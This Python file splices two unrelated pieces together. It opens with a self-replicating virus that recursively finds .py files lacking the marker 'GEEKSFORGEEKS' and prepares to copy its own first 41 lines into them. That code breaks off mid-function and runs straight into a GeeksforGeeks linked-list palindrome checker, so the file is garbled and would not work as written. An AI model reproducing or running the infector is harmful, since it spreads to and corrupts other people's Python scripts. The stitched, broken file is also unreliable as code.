#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to check if linked
# list is palindrome using stack
class Node:
	def __init__(self,data):
		
		self.data = data
		self.ptr = None
		
# Function to check if the linked list
# is palindrome or not
def ispalindrome(head):
	
	# Temp pointer
	slow = head

	# Declare a stack
	stack = []
	
	ispalin = True

	# Push all elements of the list
	# to the stack
	while slow != None:
		stack.append(slow.data)
		
		# Move ahead
		slow = slow.ptr

	# Iterate in the list again and
	# check by popping from the stack
	while head != None:

		# Get the top most element
		i = stack.pop()
		
		# Check if data is not
		# same as popped element
		if head.data == i:
			ispalin = True
		else:
			ispalin = False
			break

		# Move ahead
		head = head.ptr
		
	return ispalin

# Driver Code

# Addition of linked list
one = Node(1)
two = Node(2)
three = Node(3)
four = Node(4)
five = Node(3)
six = Node(2)
seven = Node(1)

# Initialize the next pointer
# of every current pointer
one.ptr = two
two.ptr = three
three.ptr = four
four.ptr = five
five.ptr = six
six.ptr = seven
seven.ptr = None

# Call function to check palindrome or not
result = ispalindrome(one)

print("isPalindrome:", result)

# This code is contributed by Nishtha Goel
# Time Complexity: O(n)
# Space Complexity: O(n) since we are using an auxiliary stack
